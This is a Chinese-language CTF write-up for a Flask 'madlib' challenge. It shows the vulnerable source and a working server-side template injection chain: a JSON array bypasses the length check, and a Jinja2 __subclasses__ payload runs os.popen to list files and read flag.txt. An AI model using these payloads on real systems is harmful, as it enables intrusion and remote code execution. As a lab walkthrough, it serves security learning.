# madlib

## 1、打开页面点击 **source** 得到源代码

![image-20211009144501145](https://i.loli.net/2021/10/09/t8pQ1Cbl4SNGHFA.png)

```python
from flask import Flask, render_template_string, request, send_from_directory

app = Flask(__name__)

@app.route('/')
def index():
    return send_from_directory('html', 'index.html')

@app.route('/madlib', methods=['POST'])
def madlib():
    if len(request.json) == 5:
        verb = request.json.get('verb')
        noun = request.json.get('noun')
        adjective = request.json.get('adjective')
        person = request.json.get('person')
        place = request.json.get('place')
        params = [verb, noun, adjective, person, place]
        if any(len(i) > 21 for i in params):
            return 'your words must not be longer than 21 characters!', 403
        madlib = f'To find out what this is you must {verb} the internet then get to the {noun} system through the visual MAC hard drive and program the open-source but overriding the bus won\'t do anything so you need to parse the online SSD transmitter, then index the neural DHCP card {adjective}.{person} taught me this trick when we met in {place} allowing you to download the knowledge of what this is directly to your brain.'
        return render_template_string(madlib)
    return 'This madlib only takes five words', 403

@app.route('/source')
def show_source():
    return send_from_directory('/app/', 'app.py')

app.run('0.0.0.0', port=1337)
```



## 2、填写信息，提交

![image-20211009144749015](https://i.loli.net/2021/10/09/BoAxqfE23g64l81.png)



## 3. 抓包

![image-20211009144708006](https://i.loli.net/2021/10/09/IUu6C5fc7jLt9yd.png)



## 4. 分析源代码

根据源代码可以判断出这是一道SSTI题，需要满足以下条件：

- post提交json数据到 */madlib*

- json长度等于5

- json数据中的verb、noun、adjective、person、place、params长度不能超过21



## 5. 测试SSTI

在verb处输入`{{3*8}}`输出**24**

![image-20211009145508446](https://i.loli.net/2021/10/09/Ycdm6wlk9p21shg.png)



## 6. 绕过长度判断RCE

这一步卡了挺久的，后来想到了：既然是json格式的数据，那么是否可以嵌套array呢？尝试了一下发现果然可以

![image-20211009150804297](https://i.loli.net/2021/10/09/FuhHGsf6DVlSzRA.png)

成功绕过长度限制！



## 7. RCE

可以把字符串内容写到get参数中，使用`request.args.参数名称`读取：

```http
POST /madlib?e=__import__('os').popen('ls').read()

{"verb":["{{().__class__.__bases__[0].__subclasses__()[64].__init__.__globals__['__builtins__']['eval'](request.args.e)}}",2],"noun":"456","adjective":"333","person":"444","place":"555"}
```

![image-20211009150928117](https://i.loli.net/2021/10/09/MzOkEnFPrC1y5Dh.png)



## 8. Get Flag

```http
POST /madlib?e=__import__('os').popen('cat+flag.txt').read()

{"verb":["{{().__class__.__bases__[0].__subclasses__()[64].__init__.__globals__['__builtins__']['eval'](request.args.e)}}",2],"noun":"456","adjective":"333","person":"444","place":"555"}
```

![image-20211009151148965](https://i.loli.net/2021/10/09/VQPjhBcysbirU17.png)